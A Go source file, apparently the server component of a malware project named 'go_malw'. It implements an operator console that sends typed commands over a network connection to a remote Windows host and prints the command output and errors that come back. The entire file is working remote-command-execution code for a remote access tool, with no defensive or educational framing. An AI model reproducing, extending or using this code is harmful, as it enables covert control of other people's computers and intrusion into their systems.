package ExecuteCommandWindows

import (
	"bufio"
	"encoding/gob"
	"fmt"
	"go_malw/server/core/color"
	"net"
	"os"
)

type Command struct {
	CmdOutput string
	CmdError  string
}

func ExecuteCommandRemotelyWindows(connection net.Conn) (err error) {

	reader := bufio.NewReader(os.Stdin)

	commandloop := true

	for commandloop {
		fmt.Print(color.Cyan + ">> " + color.Reset)
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(color.Red + "[-]" + color.Reset + err.Error())
			continue
		}

		connection.Write([]byte(command))
		if command == "stop\n" {
			commandloop = false
			continue
		}

		cmdStruct := &Command{}

		decoder := gob.NewDecoder(connection)
		err = decoder.Decode(cmdStruct)
		if err != nil {
			fmt.Println(color.Red + "[-]" + color.Reset + err.Error())
			continue
		}

		fmt.Println(cmdStruct.CmdOutput)
		if cmdStruct.CmdError != "" {
			fmt.Println(cmdStruct.CmdError)
		}

	}

	return
}
